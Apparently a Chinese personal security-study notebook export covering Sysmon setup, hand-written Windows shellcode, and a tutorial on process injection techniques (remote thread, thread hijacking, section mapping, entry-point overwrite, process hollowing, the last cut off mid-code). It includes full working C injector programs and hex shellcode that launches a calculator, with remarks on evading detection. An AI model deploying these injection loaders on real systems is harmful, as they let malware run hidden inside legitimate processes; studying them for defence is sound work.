代理生成的事件，然后对其进行分析，可以识别恶意活动或异常活动，并了解入侵者和恶意软件在网络上的操作方式。 下载之后解压得到： LastWriteTime Length Name 2022/9/29 20:25 7490 Eula.txt 2022/9/29 20:25 8188688 Sysmon.exe 2022/9/29 20:25 4419344 Sysmon64.exe 这里注意给的是安装文件，双击不能运行的 sysmon安装 sysmon64 -i #安装 sysmon64 -c [] #更新配置 默认配置用：sysmon64 -c -- sysmon64 -u #卸载 安装32位就不能安装64位了，所以直接安装sysmon64. sysmon使用 win+r输入：eventvwr打开事件管理器 下面找到Sysmon里的 这里就可以用了。 方便起见直接在桌面设一个快捷方式： 打开之后就可以使用这各种管理器了 ShellCode Windows的shellcode是什么，和linux的pwn里的shellcode一样是一段可执行汇编的字节码形式，一般以\\x00\\x11之类的形式存在，且有特殊目的的代码。一般是可以在目标机器上直接执行的一串机器码。 困难 shellcode定义是可以直接执行的，所以编写的时候就需要用汇编直接去写，这是人类不友好的。 还可以从已有程序中直接提取，但是会涉及到地址的问题，尤其是在现代操作系统普遍开启地址随机化之后，这是困难的。 再就是一些字符串并不在text段中，但是shellcode只包括text段的代码，所以说shellcode是有困难的。 通过loadlibrary的方式调用api函数，但是如何获得loadlibrary的地址呢？ FS寄存器 局限性 FS寄存器通常用于指向当前线程的线程本地存储（TLS）段。 TLS段是一段内存，用于存储与特定线程相关的信息。主要针对的就是32位的程序。64位的程序可以使用GS寄存器来替代。 值得注意的是，在高级语言生成的程序中例如python和C#，FS寄存器是不可用的，这是因为他们运行在虚拟机上而不是真实的CPU环境中。代码无法直接访问物理CPU的寄存器。 C#程序可以使用System.Threading命名空间中的ThreadLoca\\类来存储与特定线程相关的信息。这个类提供了一个可以为每个线程存储单独值的机制，而无需使用TLS段。例如 using System.Threading; ThreadLocal threadLocalInt = new ThreadLocal(); // 在线程A中设置threadLocalInt的值 threadLocalInt.Value = 42; // 在线程B中访问threadLocalInt的值 int value = threadLocalInt.Value; 值得注意的是，rust语言被认为是一种高级语言，因为它提供了许多方便的高级功能，如泛型、模式匹配、闭包和枚举类型。同时提供了许多低级控制和系统级功能，如直接访问内存和线程、使用底层指针和原生数据类型等。 内联汇编 gcc/clang编译器 以下代码可以将eax的值赋值给变量LoadLibrary，但是下面的程序在第五行就会发生异常无法执行，原因是FS寄存器的检索失败导致的。 int LoadLibrary; printf(\"arch point########\"); __asm__( \"mov eax, fs:[0x30]\\n\" \"mov eax, [eax+0xc]\\n\" \"mov eax, [eax+0x14]\\n\" \"mov eax, [eax]\\n\" \"mov eax, [eax+0x10]\\n\" \"mov %0, eax\" // 通过这种方式利用\"=r\"的形式将eax的值赋给变量 :\"=r\"(LoadLibrary) ); printf(\"0x%08X\\n\", LoadLibrary); 不论是gcc还是clang编译器，在编译的时候使用参数-masm=intel可以允许intel语体的汇编通过编译。默认at&t语体 vs vs在编译的时候会有各种的优化和安全措施，在调试的时候比较困难，所以需要先关一下各种优化和安全检查. (5条消息) shellcode编写_天问_Herbert555的博客-CSDN博客_shellcode编写 主要区别是针对内联汇编的语法格式问题和最后的将值赋值给变量的问题。 测试shellcode - 32bit 这是用来被注入的进程 #include #include #include int GetKernel32BaseAddress() { int AddrOfKernel; __asm__( \"mov eax, fs:[0x30]\\n\" \"mov eax, [eax+0xc]\\n\" \"mov eax, [eax+0x18]\\n\" \"mov eax, [eax]\\n\" \"mov eax, [eax+0x8]\\n\" :\"=r\"(AddrOfKernel) ); return AddrOfKernel; } int main(char argc[], char argv) { char str[128]; // printf(\"Current proc id : %d\\n\", GetCurrentProcessId()); // get baseaddress of kernel32.dll printf(\"kernel32.dll : 0x%p\",GetKernel32BaseAddress()); // get LoadLibraryA() base address printf(\"loadlibraryA : 0x%p\\n\", LoadLibraryA); // get WinExec() base address printf(\"WinExec : 0x%p\\n\", WinExec); // get ExitProcess() base address printf(\"ExitProcess() : 0x%p\\n\", ExitProcess); printf(\"hello world\\n\"); printf(\"input something or waiting\\n\"); scanf(\"%s\", str); puts(str); return 0; } shellcode，调用winexec和exitprocess函数来弹出计算器。可以用来注入32位的进程，因为地址都是硬编码写死的，所以用的时候要注意注意。 unsigned char shellcode[] = \"\\x55\\x89\\xE5\\x33\\xC0\\x50\\xB8\\x2E\\x64\\x6C\\x6C\\x50\\xB8\\x65\\x6C\\x33\\x32\\x50\\xB8\\x6B\\x65\\x72\\x6E\\x50\\x8B\\xC4\\x50\\xB8\" \"\\xA0\\x12\\xed\\x76\" \"\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x2E\\x65\\x78\\x65\\x50\\xB8\\x63\\x61\\x6C\\x63\\x50\\x8B\\xC4\\x6A\\x05\\x50\\xB8\" \"\\xF0\\xE1\\xF0\\x76\" \"\\xFF\\xD0\\x33\\xC0\\x50\\xB8\" \"\\x80\\x59\\xed\\x76\" \"\\xFF\\xD0\\x90\\x90\\xC3\"; 64-bit shellcode-失败 \"\\x55\\x48\\x8B\\xEC\\x90\\xC7\\x04\\x24\\x2E\\x64\\x6C\\x6C\\xC7\\x44\\x24\\xFC\\x65\\x6C\\x33\\x32\\xC7\\x44\\x24\\xF8\\x6B\\x65\\x72\\x6E\\x48\\x8B\\xCC\\x90\\x90\\x48\\xB8\\xA0\\x8C\\xC7\\xA7\\xFE\\x7F\\x00\\x00\\xFF\\xD0\\xBA\\x05\\x00\\x00\\x00\\xC7\\x04\\x24\\x65\\x78\\x65\\x2E\\xC7\\x44\\x24\\xFC\\x63\\x6C\\x61\\x63\\xC7\\x44\\x24\\xF8\\x00\\x00\\x00\\x00\\x48\\x8B\\xCC\\x90\\x48\\xB8\\xD0\\x77\\x41\\xA8\\xFE\\x7F\\x00\\x00\\x90\\x90\\x90\\xC3\" donut 将exe转换为shellcode的一个工具(GitHub - TheWover/donut：生成 x86、x64 或 AMD64+x86 与位置无关的外壳代码，从内存加载 .NET 程序集、PE 文件和其他 Windows 有效负载，并使用参数运行它们) Nt和Rt开头的api 以 Nt 开头的函数是 Windows NT 内核提供的 Native API，是系统内部使用的函数。 以 Rt 开头的函数是通过封装 Nt 开头函数来实现的，提供给开发人员使用。 对于以 Nt 开头的函数，可能更难使用和访问，并且它们往往没有直接对应的文档说明，但它们通常具有更高的性能。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-18 20:15:57 "},"MyArticles/CyberSec/6种常见注入方式.html":{"url":"MyArticles/CyberSec/6种常见注入方式.html","title":"windows下的进程注入（6种）","keywords":"","body":"注入方式 根据各阶段调用的API，读写的内存位置的区别进行 如下分类（实战中常用的 6 种）： 1、远程线程注入 原始的注入手法。通过API申请空间，然后将code写入内存，然后创建线程执行。这种手法基本会被监控，但是报毒与否就再说了。 流程 打开进程 ---》申请空间 ---》写入shellcode ---》创建线程执行 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, wpid); LPVOID IpBaseAddress = VirtualAllocEx(hProcess, 0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //将shellcode写入内存 WriteProcessMemory(hProcess, IpBaseAddress, shellcode, sizeof(shellcode), NULL); //创建线程执行shellcode CreateRemoteThread(hProcess, 0, 100, (LPTHREAD_START_ROUTINE)IpBaseAddress, 0, 0, NULL); 实现代码 #include #include #include unsigned char shellcode[] = \"\\x55\\x89\\xE5\\x33\\xC0\\x50\\xB8\\x2E\\x64\\x6C\\x6C\\x50\\xB8\\x65\\x6C\\x33\\x32\\x50\\xB8\\x6B\\x65\\x72\\x6E\\x50\\x8B\\xC4\\x50\\xB8\\xA0\\x12\\x86\\x76\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x2E\\x65\\x78\\x65\\x50\\xB8\\x63\\x61\\x6C\\x63\\x50\\x8B\\xC4\\x6A\\x05\\x50\\xB8\\xF0\\xE1\\x89\\x76\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x80\\x59\\x86\\x76\\xFF\\xD0\\x90\\x90\\xC3\"; int main() { //计算器的进程号，准备注入他的进程 int wpid = 3632; //打开一个进程，后面指定PID HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, wpid); printf(\"%d\\n\", hProcess); //申请内存空间，最后赋予空间权限 LPVOID IpBaseAddress = VirtualAllocEx(hProcess, 0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); printf(\"IpBaseAddress : %p\\n\", IpBaseAddress); //将shellcode写入内存 WriteProcessMemory(hProcess, IpBaseAddress, shellcode, sizeof(shellcode), NULL); printf(\"WriteProcess\\n\"); //创建线程执行shellcode CreateRemoteThread(hProcess, 0, 100, (LPTHREAD_START_ROUTINE)IpBaseAddress, 0, 0, NULL); return 0; } 动态验证 VirtualAllocEx申请内存之后返回的地址，在内存中查看，可以看到一段全空空间。 在内存布局中查看，有一段ERW权限的申请出来的空间，大小是0x1000. 通过WriteProcessAddress函数将shellcode写进去，就可以在空间中看到写进去的code 但是这里通过内存查看，返现写进去的东西有点奇怪，和自己想的不一样。 因为\\\\x就不是16进制的数字了。而且\\xxx这个特殊的字符是不被允许的，找了好久才发现这个问题 这个 方式可以动态的调试shellcode 2、线程劫持注入 就是劫持一个线程进行注入，然后再恢复这个线程，就像是荆轲刺秦你迷晕了荆轲换了他的地图，再叫醒他去刺杀秦王一样，这个换了的地图就是shellcode。 流程 挂起目标线程，申请内存，写入shellcode，修改线程上下文使其指向shellcode，恢复线程执行shellcode 需要注意的是，这里需要先创建一个进程，而不是直接打开现存的进程。因为需要一个挂起状态 代码 #include #include void showstruct(PROCESS_INFORMATION pii) { printf(\"\\ndwProcessId: %d\\n\", pii.dwProcessId); printf(\"dwThreadId: %d\\n\", pii.dwThreadId); // Handle,也叫句柄，实际上是一个数据，是一个Long (整长型)的数据，是一种指向指针的指针。 printf(\"hProcess: 0x%p\\n\", pii.hProcess); printf(\"hThread: 0x%p\\n\", pii.hThread); printf(\"===============================================================================\\n\"); } int main() { // 定义两个进程相关的结构体变量，都是内置结构体，可以直接定义，然后初始化为0 STARTUPINFO si = { 0 }; PROCESS_INFORMATION pi = { 0 }; /* typedef struct _PROCESS_INFORMATION { HANDLE hProcess; HANDLE hThread; DWORD dwProcessId; DWORD dwThreadId; } PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION; */ // 创建一个名称为notepad。exe的进程，不用从父进程继承，创建之后状态为挂起，并且将信息赋值给si和pi if (!CreateProcess(NULL, \"notepad.exe\", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) { printf(\"Create process failed error code: %d\\n\", (int)GetLastError()); return 1; } // 根据进程id打开进程 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId); if (hProcess == NULL) { printf(\"Open process failed error code: %d\\n\", (int)GetLastError()); return 1; } // Shellcode，这里为了证明确实执行了，所以直接通过中断来验证 char shellcode[] = \"\\xcc\\xcc\\xB8\\x01\\x00\\x00\\x00\\xC3\"; // 利用api挂起进程 SuspendThread(pi.hThread); // 申请一个目标进程中的内存区域 LPVOID lpBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (lpBuffer == NULL) { printf(\"Virtual alloc failed error code ：%d\\n\", (int)GetLastError()); return 1; } // 显示出来申请区域的地址，方便调试的时候找 printf(\"shellcode address is : %p\\n\", lpBuffer); // 将shellcode写进去，和远程进程注入一样 if (!WriteProcessMemory(hProcess, lpBuffer, shellcode, sizeof(shellcode), NULL)) { printf(\"Write process memory failed error code：%d\\n\", (int)GetLastError()); return 1; } // 设置线程的上下文环境，让ip寄存器直接跳转 CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_ALL; if (!GetThreadContext(pi.hThread, &ctx)) { printf(\"GetThreadContext failed error code ：%d\\n\", (int)GetLastError()); return 1; } // 设置ip寄存器直接指向那块地址 ctx.Rip = (DWORD64)lpBuffer; // 设置保存线程环境 if (!SetThreadContext(pi.hThread, &ctx)) { printf(\"SetThreadContext failed error code ：%d\\n\", (int)GetLastError()); return 1; } // 恢复线程环境，这时就可以执行shellcode了 if (ResumeThread(pi.hThread) == -1) { printf(\"ResumeThread failed error code ：%d\\n\", (int)GetLastError()); return 1; } // 等待目标进程结束（这里可以直接从任务管理器关闭） WaitForSingleObject(pi.hProcess, INFINITE); // 清理恢复句柄释放空间 CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return 0; } 经过验证发现是成功的，可以执行到shellcode的位置。但是缺点就是执行会创建一个新的线程，虽然在挂起的状态下前端不会有什么显示，但是还是不巧妙。 以上的方法属于是同一类，仅仅是执行的方式不同，下面通过更换申请内存的方式来进行注入。 3、映射注入 就是通过在内存中申请一块公共内存，然后将这块内存映射到注入程序和被注入程序，这样需要修改shellcode的时候仅需要在注入程序中修改，就可以同时映射到被注入内存中。 这种注入方式规避了VirtualAllocEx和WriteProcessMemory这些写内存的敏感函数的检测，所以该方法一般被用来当作是一种写shellcode的方式，和其他的执行方式相结合 但是在分享的时候没有给出具体的代码，只给出了零碎的一些片段 // 创建一个内存区域，并且读写执行权限 NtCreateSection(&sectionHandle, SECTION_MAP_READ|SECTION_MAP_WRITE|SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL); // 将这块内存区域映射到注入进程中 NtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE); // 将shellcode复制到内存区域 memcpy(localSectionAddress, shellcode, sizeof(shellcode)); // 创建远程线程执行 RtCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL); NtCreateSection NtCreateSection( &sectionHandle, // 接收节对象的句柄的 HANDLE 变量的指针 SECTION_MAP_READ|SECTION_MAP_WRITE|SECTION_MAP_EXECUTE, // 确定对对象的请求访问权限 NULL, // 不使用文件映像，而是创建一个空的内存区域。 (PLARGE_INTEGER)&sectionSize, // 指定节的最大大小（以字节为单位） PAGE_EXECUTE_READWRITE, // 指定要在节中的每个页面上放置的保护 SEC_COMMIT, // 分配属性的 SEC_XXX 标志的位掩码 NULL); // 不适用额外的文件句柄。 NtMapViewOfSection 这是一个未公开的api函数，这个函数在用户态下执行，而且不会被判断异常 NtMapViewOfSection( sectionHandle, // 要映射的内存区域的句柄。 GetCurrentProcess(), // 指定要映射到内存的句柄（这里就是自己的线程） &localSectionAddress, // 用于接收映射到当前进程中的内存区域的起始地址。 NULL, // 不指定映射到当前进程中的起始地址 NULL, // 不指定映射到当前进程中的内存区域的大小 NULL, // 不指定内存区域的偏移量。 &size, // 用于接收内存区域的大小。 2, // 指定内存区域的类型，2 表示映射到当前进程的内存地址空间。 NULL, // 表示不指定任何额外的信息 PAGE_READWRITE); // 内存页的保护模式，表示该内存页可读、可写。 这个函数的定义来自chatgpt，很佩服啊 RtlCreateUserThread 这个函数需要引用ntdll.lib，但是仅限于x64的程序 RtCreateUserThread( targetHandle, // 指定要注入的进程的句柄 NULL, // 不指定线程的安全标志 FALSE, // 指定线程是否独占，FALSE 表示不独占 0, // 线程栈的大小，0表示默认的大小 0, // 线程的优先级，0表示默认 0, // 线程的初始挂起状态，0 表示线程在创建后立即开始执行 remoteSectionAddress, // 指定要执行的 shellcode 的起始地址，该地址在注入进程中 NULL, // 表示不指定线程的线程函数的参数 &targetThreadHandle, // 用于接收新创建的线程的句柄 NULL); // 表示不接收线程的创建时间 测试的shellcode，还是弹出一个计算器的功能，仅限于32位的程序 unsigned char shellcode[] = \"\\x55\\x89\\xE5\\x33\\xC0\\x50\\xB8\\x2E\\x64\\x6C\\x6C\\x50\\xB8\\x65\\x6C\\x33\\x32\\x50\\xB8\\x6B\\x65\\x72\\x6E\\x50\\x8B\\xC4\\x50\\xB8\\xA0\\x12\\xC4\\x76\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x2E\\x65\\x78\\x65\\x50\\xB8\\x63\\x61\\x6C\\x63\\x50\\x8B\\xC4\\x6A\\x05\\x50\\xB8\\xF0\\xE1\\xC7\\x76\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x80\\x59\\xC4\\x76\\xFF\\xD0\\x90\\x90\\xC3\"; 代码实现 参考：https://idiotc4t.com/code-and-dll-process-injection/mapping-injection #include #include #pragma comment(lib, \"ntdll.lib\") #pragma comment (lib, \"OneCore.lib\") unsigned char shellcode[] = \"\\x55\\x89\\xE5\\x33\\xC0\\x50\\xB8\\x2E\\x64\\x6C\\x6C\\x50\\xB8\\x65\\x6C\\x33\\x32\\x50\\xB8\\x6B\\x65\\x72\\x6E\\x50\\x8B\\xC4\\x50\\xB8\\xA0\\x12\\xC4\\x76\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x2E\\x65\\x78\\x65\\x50\\xB8\\x63\\x61\\x6C\\x63\\x50\\x8B\\xC4\\x6A\\x05\\x50\\xB8\\xF0\\xE1\\xC7\\x76\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x80\\x59\\xC4\\x76\\xFF\\xD0\\x90\\x90\\xC3\"; int main() { HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), NULL); if (hMapping == 0) return 0; LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, sizeof(shellcode)); if (lpMapAddress == 0) return 0; memcpy((PVOID)lpMapAddress, shellcode, sizeof(shellcode)); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 22508); // 打开句柄为25032的进程，并返回句柄。PROCESS_ALL_ACCESS表示需要完全访问权限。 LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ); // 将映射对象映射到句柄为hProcess的进程的地址空间，以便在该进程中执行代码。PAGE_EXECUTE_READ表示需要执行和读取权限。 HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, NULL, 0, NULL); /*下面的代码仅适合于64位的程序 HANDLE hThread = NULL; LPVOID lpParameter = NULL; RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, lpMapAddress, lpParameter, &hThread, NULL); */ UnmapViewOfFile(lpMapAddress); CloseHandle(hMapping); return 0; } 4、覆盖入口点注入 在创建进程的时候，直接将进程的入口点的代码更改为shellcode，最后恢复挂起的主线程；缺点是为了达到线程开始挂起的状态，只能通过创建的方式进行，不能通过打开现有进程的方式执行。 流程 创建进程后挂起进程，通过PE文件结构找到入口点，将shellcode直接写入进程的入口点，然后恢复线程。 整个流程类似于线程劫持注入的过程，只不过这里是直接覆盖了入口点的代码。 关键函数：函数具体参考定义) __kernel_entry NTSTATUS NtQueryInformationProcess( [in] HANDLE ProcessHandle, //要检索其信息的进程的句柄。 [in] PROCESSINFOCLASS ProcessInformationClass, [out] PVOID ProcessInformation, [in] ULONG ProcessInformationLength, [out, optional] PULONG ReturnLength ); [in] ProcessInformationClass 要检索的进程信息的类型。 此参数可以是 PROCESSINFOCLASS 枚举中的以下值之一。 Value 含义 ProcessBasicInformation0 检索指向 PEB 结构的指针，该结构可用于确定是否正在调试指定的进程，以及系统用于标识指定进程的唯一值。使用 CheckRemoteDebuggerPresent 和 GetProcessId 函数获取此信息。 ProcessDebugPort7 检索一个 DWORD_PTR 值，该值是进程的调试器的端口号。 非零值指示进程在环 3 调试器的控制下运行。使用 CheckRemoteDebuggerPresent 或 IsDebuggerPresent 函数。 ProcessWow64Information26 确定进程是否在 WOW64 环境中运行， (WOW64 是 x86 模拟器，它允许基于 Win32 的应用程序在 64 位 Windows) 上运行。使用 IsWow64Process2 函数获取此信息。 ProcessImageFileName27 检索包含进程映像文件名称的 UNICODE_STRING 值。使用 QueryFullProcessImageName 或 GetProcessImageFileName 函数获取此信息。 ProcessBreakOnTermination29 检索一个 ULONG 值，该值指示进程是否被视为关键。注意 此值可以在 Windows XP 和 SP3 中使用。 从 Windows 8.1 开始，应改用 IsProcessCritical。 ProcessSubsystemInformation75 检索指示进程的子系统类型的 SUBSYSTEM_INFORMATION_TYPE 值。 ProcessInformation 参数指向的缓冲区应足够大，可以容纳单个SUBSYSTEM_INFORMATION_TYPE枚举。 找到入口点 利用PEB结构找到里面的PebBaseAddress项，定位到内存中的pe文件的头，就是MZ的位置。然后通过DOS头里的e_lfanew项的值，定位到NT头就是PE的位置，然后找到可选头，直接获得里面的程序入口点+imageBase 写入代码 通过WriteProcessMemory直接把shellcode写入上述计算出来的函数的入口点的地址指向的地方。 执行 通过ResumeThread函数直接执行，或者利用CreateRemoteThread函数来执行 实现代码 #include #include #include // 32bit unsigned char shellcode[] = \"\\xcc\\xc3\\x55\\x89\\xE5\\x33\\xC0\\x50\\xB8\\x2E\\x64\\x6C\\x6C\\x50\\xB8\\x65\\x6C\\x33\\x32\\x50\\xB8\\x6B\\x65\\x72\\x6E\\x50\\x8B\\xC4\\x50\\xB8\" \"\\xA0\\x12\\xed\\x76\" \"\\xFF\\xD0\\x33\\xC0\\x50\\xB8\\x2E\\x65\\x78\\x65\\x50\\xB8\\x63\\x61\\x6C\\x63\\x50\\x8B\\xC4\\x6A\\x05\\x50\\xB8\" \"\\xF0\\xE1\\xF0\\x76\" \"\\xFF\\xD0\\x33\\xC0\\x50\\xB8\" \"\\x80\\x59\\xed\\x76\" \"\\xFF\\xD0\\x90\\x90\\xC3\"; // 64bit unsigned char shellcode64[] = \"\\xcc\\xc3\\x55\\x48\\x8B\\xEC\\x90\\xC7\\x04\\x24\\x2E\\x64\\x6C\\x6C\\xC7\\x44\\x24\\xFC\\x65\\x6C\\x33\\x32\\xC7\\x44\\x24\\xF8\\x6B\\x65\\x72\\x6E\\x48\\x8B\\xCC\\x90\\x90\\x48\\xB8\" \"\\xA0\\x8C\\xC7\\xA7\\xFE\\x7F\\x00\\x00\" \"\\xFF\\xD0\\xBA\\x05\\x00\\x00\\x00\\xC7\\x04\\x24\\x65\\x78\\x65\\x2E\\xC7\\x44\\x24\\xFC\\x63\\x6C\\x61\\x63\\xC7\\x44\\x24\\xF8\\x00\\x00\\x00\\x00\\x48\\x8B\\xCC\\x90\\x48\\xB8\" \"\\xD0\\x77\\x41\\xA8\\xFE\\x7F\\x00\\x00\" \"\\x90\\x90\\x90\\xC3\"; typedef struct _PROCESS_BASIC_INFORMATION { PVOID Reserved1; PVOID PebBaseAddress; PVOID Reserved2[2]; ULONG_PTR UniqueProcessId; PVOID Reserved3; } PROCESS_BASIC_INFORMATION; typedef LONG(NTAPI* NtQueryInformationProcessPtr)( HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength ); int main() { // NtQueryInformationProcess api在ntdll里，属于未公开的函数，所以需要动态调用 HMODULE hNtdll = LoadLibraryA(\"ntdll.dll\"); if (hNtdll == NULL) { printf(\"无法加载 ntdll.dll 库\\n\"); return 1; } // 设置启动信息和进程信息，保留在结构体里，方便后续操作 STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 }; // 因为需要一个挂起状态的进程，所以需要Create，而不能Open，而且需要执行入口点，所以只能创建 if (!CreateProcessA(NULL, (LPSTR)\"C:\\\\Windows\\\\System32\\\\svchost.exe\", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) { printf(\"CreateProcessA 失败，错误码 %lu\\n\", GetLastError()); return 1; } NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hNtdll, \"NtQueryInformationProcess\"); //find base addr by peb PROCESS_BASIC_INFORMATION pbi; ULONG ReturnLength; NTSTATUS status = NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), &ReturnLength); if (status != 0) { printf(\"NtQueryInformationProcess 失败，错误码 %lu\\n\", status); return 1; } // peb offset DWORD_PTR pef_offset = (DWORD_PTR)pbi.PebBaseAddress + 0x10; LPVOID imagebase_addr = 0; if (!ReadProcessMemory(pi.hProcess, (LPVOID)pef_offset, &imagebase_addr, sizeof(LPVOID), NULL)) { printf(\"读取目标进程的Peb结构体失败，错误码 %lu\\n\", GetLastError()); return 1; } // MZ address printf(\"imagebase_addr: 0x%p\", imagebase_addr); //（EntryPoint） // dos header IMAGE_DOS_HEADER dosHeader = { 0 }; if (!ReadProcessMemory(pi.hProcess, imagebase_addr, &dosHeader, sizeof(dosHeader), NULL)) { printf(\"读取目标进程的DOS头失败，错误码 %lu\\n\", GetLastError()); return 1; } // nt header // 这里需要定义一个结构体，用PIMAGE_NT_HEADERS定义的话默认定义了一个类型的指针但是并没有开辟内存空间，所以会报错 IMAGE_NT_HEADERS ntHeader = { 0 }; DWORD nt_offset = dosHeader.e_lfanew; // 定位到nt头的位置 if (!ReadProcessMemory(pi.hProcess, (LPVOID)((DWORD_PTR)imagebase_addr + nt_offset), &ntHeader, sizeof(ntHeader), NULL)) { printf(\"读取目标进程的NT头失败，错误码 %lu\\n\", GetLastError()); return 1; } // 找到可选头里的入口偏移，然后算EntryPoint的真实地址 LPVOID entry_point = (LPVOID)(ntHeader.OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)imagebase_addr); // 将入口点的代码覆盖掉 if (!WriteProcessMemory(pi.hProcess, entry_point, shellcode64, sizeof(shellcode64), NULL)) { printf(\"修改进程入口点代码失败，错误码 %lu\\n\", GetLastError()); } // 恢复主线程执行 ResumeThread(pi.hThread); WaitForSingleObject(pi.hProcess, INFINITE); CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return 0; } 5、傀儡进程 根据统计这是比较经典的进程注入的方式，所以被很多的恶意软件和APT组织所使用，所以导致目前主流的杀毒软件和沙箱都对他有很完善的检查策略，所以基本没有什么实际的用处了。 流程 创建一个挂起的进程，然后将该进程的内存映射取消掉，换成shellcode或者payload这些代码，然后再恢复进程运行状态 挂起进程 通过创建的方式创建一个挂起状态的进程，和之前的几个一个套路 取消映射 利用 NtUnmapViewOfSection来取消原来的映射，并利用VirtualAllocEx函数申请内存区域。 重新申请 利用VirtualAllocEx重新申请一块空间，然后把准备好的东西写进去 设置PEB 重新写PEB里的base address【64->RDX】并设置好RCX寄存器（64位） 恢复执行 直接resume就行了（不要注入svchost） 实现代码 #include #include #include typedef LONG(NTAPI* NtUnMapViewOfSectionPtr)(HANDLE hProcess, PVOID BaseAddress); typedef struct _PROCESS_BASIC_INFORMATION { PVOID Reserved1; PVOID PebBaseAddress; PVOID Reserved2[2]; ULONG_PTR UniqueProcessId; PVOID Reserved3; } PROCESS_BASIC_INFORMATION; typedef LONG(NTAPI* NtQueryInformationProcessPtr)( HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength ); int main(int argc, char* argv[]) { // 准备要往里面替换的进程,一定要使用完整目录 LPCSTR file_path = \"E:\\\\信息安全知识学习\\\\ProcessThread注入\\\\进程注入学习代码\\\\傀儡进程注入\\\\x64\\\\Debug\\\\injected.exe\"; HANDLE hFile = CreateFileA(file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { printf(\"Open EXE File Failed error code: %d\", GetLastError()); return 1; } DWORD dwFileSize = GetFileSize(hFile, NULL); PBYTE pBuf = (PBYTE)malloc(dwFileSize); DWORD dwBytesRead = 0; if (!ReadFile(hFile, pBuf, dwFileSize, &dwBytesRead, NULL)) { printf(\"ReadFile Failed error code: %d\", GetLastError()); CloseHandle(hFile); free(pBuf); return 1; } // 得到主要运行内容的dos和nt头 PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuf; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pBuf + pDosHeader->e_lfanew); //2.获取进程上下文 ： 第一步：创建傀儡进程外壳，设置挂起状态，保存上下文信息 STARTUPINFO si = { sizeof(si) }; PROCESS_INFORMATION pi = { 0 }; if (!CreateProcessA(NULL, (LPSTR)\"E:\\\\信息安全知识学习\\\\ProcessThread注入\\\\进程注入学习代码\\\\傀儡进程注入\\\\x64\\\\father.exe\", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) { printf(\"CreateProcessA 失败，错误码 %lu\\n\", GetLastError()); return 1; } CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL; if (GetThreadContext(pi.hThread, &ctx) == 0) { printf(\"CreateProcess failed %d\\n\", GetLastError()); return 1; } //3.清空目标进程 ： 第二步：取消原先的进程的内存 HMODULE hNtdll = LoadLibraryA(\"ntdll.dll\"); if (hNtdll == NULL) { printf(\"无法加载 ntdll.dll 库\\n\"); return 1; } NtUnMapViewOfSectionPtr NtUnMapViewOfSection = (NtUnMapViewOfSectionPtr)GetProcAddress(hNtdll, \"NtUnmapViewOfSection\"); LPVOID dwProcessBaseAddr = 0; // 获取目标进程的base address， 然后将他的内存取消注册 // context.Ecx = 基地址的地址，因此从context.Ebx + 8的地址读取4字节的内容并转化为DWORD类型，既是进程加载的基地址 if (!ReadProcessMemory(pi.hProcess, (LPCVOID)ctx.Rcx, &dwProcessBaseAddr, sizeof(PVOID), NULL)) { printf(\"ReadProcessMemory failed %lu\\n\", GetLastError()); return 1; } // 通过x64dbg看到确实可以 NtUnMapViewOfSection(pi.hProcess, (LPCVOID)ctx.Rcx); //4.重新分配空间 LPVOID lpAddr = VirtualAllocEx(pi.hProcess, (LPVOID)pNtHeaders->OptionalHeader.ImageBase, 